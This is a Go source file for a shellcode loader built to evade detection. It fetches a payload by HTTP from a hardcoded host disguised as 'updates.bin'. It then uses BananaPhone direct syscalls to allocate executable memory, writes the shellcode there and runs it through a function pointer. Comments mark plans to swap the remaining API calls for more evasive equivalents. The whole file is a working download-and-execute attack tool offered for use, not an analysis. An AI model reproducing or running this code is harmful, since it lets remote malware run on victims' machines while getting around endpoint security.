package main

import (
	"fmt"
	"io"
	"net/http"
	s "syscall"
	"unsafe"

	b "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

// Windows API consts!
// https://www.magnumdb.com goated site
const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// url input used to d r
func DownloadARun(url string) error {

	// Get shellcode from URL
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("Something went wrong while attempting to query for url %v", err)
	}
	defer resp.Body.Close()

	responseGot, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Something went wrong while reading resp body?? %v", err)
	}

	// shellcode code obtained from server so its hosted like
	// python -m http.server 8080 as an example so we fetch it directly, needs to be direct or won't work
	scode := responseGot

	// grab current PID
	tProcess := s.Getpid() // TODO swap to banana phone equilevant asap

	// Open proccu handle

	// TOODO: Replace open process syscall with a banana phone equilevant ASAP
	pHandle, err := s.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(tProcess))
	if err != nil {
		return fmt.Errorf("Opening process handle failed wtf??? %v", err)
	}
	defer s.CloseHandle(pHandle) // TODO swap to banana phone equilevant asap

	// Get NtAllocateVirtualMemory s ID!
	ntAllocID, _ := b.GetSysIDFromDisk("NtAllocateVirtualMemory")

	// bp = bananaphone
	bp, err := b.NewBananaPhone(b.AutoBananaPhoneMode)
	if err != nil {
		return fmt.Errorf("Error creating new banana phone: %v", err)
	}

	// Allocate
	var zero uintptr
	var sz uintptr = uintptr(len(scode))
	errcode, err := b.Syscall(
		ntAllocID,
		uintptr(pHandle),                // proc handle
		uintptr(unsafe.Pointer(&zero)),  // baddress should zero
		0,                               // zero
		uintptr(unsafe.Pointer(&sz)),    // RegionSize so pointer to size
		uintptr(MEM_COMMIT|MEM_RESERVE), // alloc type
		uintptr(PAGE_EXECUTE_READWRITE), // protect
	)

	// no errors no error code
	if err != nil || errcode != 0 {
		return fmt.Errorf("NtAllocVirtualMem failed wtf status=0x%x, err=%v", errcode, err)
	}

	rPtr := zero // baddress now filled in

	// Copy shellcode into js allocated mem
	var written uintptr

	ntWriteID, _ := bp.GetSysID("NtWriteVirtualMemory")

	// write
	errcode, err = b.Syscall(ntWriteID,
		uintptr(pHandle),
		rPtr,
		uintptr(unsafe.Pointer(&scode[0])),
		uintptr(len(scode)),
		uintptr(unsafe.Pointer(&written)),
	)

	if errcode != 0 || err != nil {
		return fmt.Errorf("NtWriteVirtualMemory failed: status=0x%x, err=%v\n", errcode, err)

	}

	// def a func pointer and call it aka exec
	fmt.Println("Executing shellcode!!")
	funcPtr := *(*func())(unsafe.Pointer(&rPtr))
	funcPtr()

	return nil
}

func main() {
	// Url to download shellcode payload from directly, CHANGE THIS!
	url := "http://10.10.10.10:8080/updates.bin" // CHANGE!!!
	if err := DownloadARun(url); err != nil {
		fmt.Printf("Fatal error happened while attempting to load and exec: %v\n", err)
	}
}
